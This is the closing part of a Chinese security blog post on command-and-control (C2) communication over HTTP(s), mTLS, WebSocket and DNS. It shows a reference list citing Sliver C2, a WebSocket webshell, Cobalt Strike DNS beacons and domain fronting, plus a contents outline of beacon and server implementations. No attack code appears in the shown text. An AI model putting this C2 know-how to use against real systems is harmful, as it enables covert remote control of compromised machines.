<p>还有对大家说一声非常抱歉，由于时间紧迫，技术、经验、以及认知等多方面的不足，导致这篇文章写的不是很满意，有一些内容没有做实验验证，文章中的看法只是个人见解，观点非常狭隘，有不足之处还请各位师傅指出！</p>
<p>各位师傅，都看到这里了，求个<strong>点赞、收藏加关注</strong>不过分吧？(◍•ᴗ•◍)。我保证下篇文章同样精彩，虽然我没写，不出意外12月底前至少发一篇文章，到时候来个年度总结。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/mtls.go">sliver&#x2F;server&#x2F;c2&#x2F;mtls.go at master · BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/implant/sliver/transports/mtls/mtls.go">sliver&#x2F;implant&#x2F;sliver&#x2F;transports&#x2F;mtls&#x2F;mtls.go at master · BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket | 菜鸟教程</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/veo/wsMemShell?tab=readme-ov-file">veo&#x2F;wsMemShell: WebSocket 内存马&#x2F;Webshell，一种新型内存马&#x2F;WebShell技术</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ipw.cn/dns/">域名解析查询 | DNS查询 | IPv6解析 | 在线dig | IP查询(ipw.cn)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.runoob.com/np/dns-protocol.html">DNS 协议 | 菜鸟教程</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/6457.html">DNS报文格式解析（非常详细） - C语言中文网</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/blob/master/server/c2/dns.go">sliver&#x2F;server&#x2F;c2&#x2F;dns.go at master · BishopFox&#x2F;sliver</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/no0be/DNSlivery">no0be&#x2F;DNSlivery：通过 DNS 轻松交付文件和有效负载</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2252">奇安信攻防社区-红队工具研究篇 - Sliver C2 通信流量分析</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/292228.html">浅析恶意软件通信技术：基于DoH的C2信道 - FreeBuf网络安全行业门户</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/DoHC2">SpiderLabs&#x2F;DoHC2：DoHC2 允许通过 DNS over HTTPS （DoH） 利用 Ryan Hanson （https://github.com/ryhanson/ExternalC2） 的 ExternalC2 库进行命令和控制 （C2）。</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://dominicbreuker.com/post/learning_sliver_c2_05_transports_in_detail_dns/#:~:text=Pass%20it%20as%20an%20argument%20to%20the%20dns,ID%20Name%20Protocol%20Port%201%20dns%20udp%2053">学习 Sliver C2 （05） - 传输详细信息：DNS |文&#x2F;素</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7533">踩坑记录-DNS Beacon-先知社区</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/16905617.html">内网渗透神器CobaltStrike之DNS Beacon(四) - 亨利其实很坏 - 博客园</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.z3ratu1.top/CS%20DNS%20beacon%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E6%8C%87%E5%8C%97.html">CS DNS beacon二次开发指北 | Z3ratu1’s blog</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/334022.html">Cobalt Strike: 解密DNS流量 – Part 5 - FreeBuf网络安全行业门户</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12070">C2隐匿-云函数&amp;域前置-先知社区</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cqm7qf90lnec5jjug7b0">流量对抗-域前置基础设施搭建 | 长亭百川云</a></p>
</li>
</ol>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/10/12/Go%E5%A4%9A%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2025-10-14 21:59:51
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="安全开发_C2">
                        <b>#</b> 安全开发_C2
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81HTTP-HTTPS"><span class="toc-text">一、HTTP&#x2F;HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">1.1 思路构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">1.2 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-Server"><span class="toc-text">1.2.1 Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-Beacon"><span class="toc-text">1.2.2 Beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">1.3 流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E5%9F%9F%E5%89%8D%E7%BD%AE"><span class="toc-text">1.4 域前置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81mTLS"><span class="toc-text">二、mTLS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">2.1 思路构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">2.2 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6"><span class="toc-text">2.2.1 生成证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-Server"><span class="toc-text">2.2.2 Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-Beacon"><span class="toc-text">2.2.3 Beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">2.3 流量分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81WebSocket"><span class="toc-text">三、WebSocket</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">3.1 思路构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">3.2 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-server"><span class="toc-text">3.2.1 server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-beacon"><span class="toc-text">3.2.2 beacon</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">3.3 流量分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81DNS"><span class="toc-text">四、DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">4.1 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89DNS%E5%8D%8F%E8%AE%AE"><span class="toc-text">（一）DNS协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84"><span class="toc-text">（二）报文结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Cobalt-Strike-DNS-Beacon%E4%BD%BF%E7%94%A8"><span class="toc-text">4.2 Cobalt Strike DNS Beacon使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%B3%A8%E5%86%8C%E5%9F%9F%E5%90%8D%E5%92%8C%E6%B7%BB%E5%8A%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">（一）注册域名和添加记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%88%9B%E5%BB%BADNS%E7%9B%91%E5%90%AC%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E4%B8%8A%E7%BA%BF"><span class="toc-text">（二）创建DNS监听器并完成上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">（三）流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9"><span class="toc-text">（四）需要注意的点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-text">4.3 思路构建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">4.4 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%8F%91%E9%80%81%E5%BF%83%E8%B7%B3%E5%8C%85-Beacon"><span class="toc-text">（一）发送心跳包-Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%A7%A3%E6%9E%90%E5%9B%9E%E4%BC%A0%E6%95%B0%E6%8D%AE-server"><span class="toc-text">（二）解析回传数据-server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E8%8E%B7%E5%8F%96%E4%BB%BB%E5%8A%A1%E3%80%81%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E3%80%81%E5%9B%9E%E4%BC%A0%E7%BB%93%E6%9E%9C-Beacon"><span class="toc-text">（三）获取任务、执行任务、回传结果-Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%AE%9E%E9%AA%8C"><span class="toc-text">（四）实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%B8%8B%E4%B8%80%E6%AD%A5%E8%AE%A1%E5%88%92"><span class="toc-text">五、下一步计划</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
        placeholder: 'Welcome!',
        avatar: 'retro',
        lang: 'en'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright © 2025 oneday</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + C2%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTP(s)%E3%80%81mTLS%E3%80%81WebSocket%E3%80%81DNS + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F10%2F14%2FC2%25E9%2580%259A%25E4%25BF%25A1%25E5%258D%258F%25E8%25AE%25AE%25E8%25A7%25A3%25E6%259E%2590%25EF%25BC%2588%25E4%25B8%2580%25EF%25BC%2589%25EF%25BC%259AHTTP-s-%25E3%2580%2581mTLS%25E3%2580%2581WebSocket%25E3%2580%2581DNS%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/10/14/C2%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTP-s-%E3%80%81mTLS%E3%80%81WebSocket%E3%80%81DNS/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
